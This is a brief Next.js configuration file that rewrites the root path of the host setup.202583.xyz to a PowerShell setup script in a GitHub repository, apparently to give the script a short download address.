module.exports = {
  async rewrites() {
    return [
      {
        source: '/',
        has: [
          {
            type: 'host',
            value: 'setup.202583.xyz',
          },
        ],
        destination: 'https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1',
      },
    ];
  },
};
